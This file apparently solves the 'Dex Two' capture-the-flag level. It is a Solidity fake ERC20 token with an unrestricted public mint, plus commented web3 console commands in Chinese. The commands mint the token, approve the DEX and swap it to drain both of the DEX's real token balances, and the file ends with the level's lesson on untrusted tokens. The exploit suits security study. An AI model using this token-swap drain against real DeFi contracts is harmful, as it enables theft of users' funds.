// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Dex2 is ERC20 {
    constructor() ERC20("token3","T3")  {
    }
    function setBalance(address addr, uint256 amount) public {
        _mint(addr, amount);
    }
}

// 给player 发100
//web3.eth.sendTransaction({from:player, to:"0x2365F0f62bb64bd7479C997Cba5b790eD0B87716", data:web3.utils.sha3("setBalance(address,uint256)").slice(0,10) + "000000000000000000000000" + player.slice(2) + "0000000000000000000000000000000000000000000000000000000000000064"})
// 给contract发100
//web3.eth.sendTransaction({from:player, to:"0x2365F0f62bb64bd7479C997Cba5b790eD0B87716", data:web3.utils.sha3("setBalance(address,uint256)").slice(0,10) + "000000000000000000000000" + contract.address.slice(2) + "0000000000000000000000000000000000000000000000000000000000000064"})
// 授权contract使用player的东西
//web3.eth.sendTransaction({from:player, to:"0x2365F0f62bb64bd7479C997Cba5b790eD0B87716", data:web3.utils.sha3("approve(address,uint256)").slice(0,10) + "000000000000000000000000" + contract.address.slice(2) + "0000000000000000000000000000000000000000000000000000000000000fff"})
// 进行swap token1
//contract.swap("0x2365F0f62bb64bd7479C997Cba5b790eD0B87716", await contract.token1(), 100)
// 查看token1的余额
//(await contract.balanceOf(await contract.token1(), contract.address)).toString()

// 现在player的token3余额为0，contract的token3余额为200
// 为了置换token2的100，需要充值给player 200的token3
//web3.eth.sendTransaction({from:player, to:"0x2365F0f62bb64bd7479C997Cba5b790eD0B87716", data:web3.utils.sha3("setBalance(address,uint256)").slice(0,10) + "000000000000000000000000" + player.slice(2) + "00000000000000000000000000000000000000000000000000000000000000c8"})
// 进行swap token2
//contract.swap("0x2365F0f62bb64bd7479C997Cba5b790eD0B87716", await contract.token2(), 200)
// 查看token2的余额
//(await contract.balanceOf(await contract.token2(), contract.address)).toString()

//As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

//Just because a contract claims to implement the ERC20 spec does not mean it's trust worthy.

//Some tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.

//Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

//If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.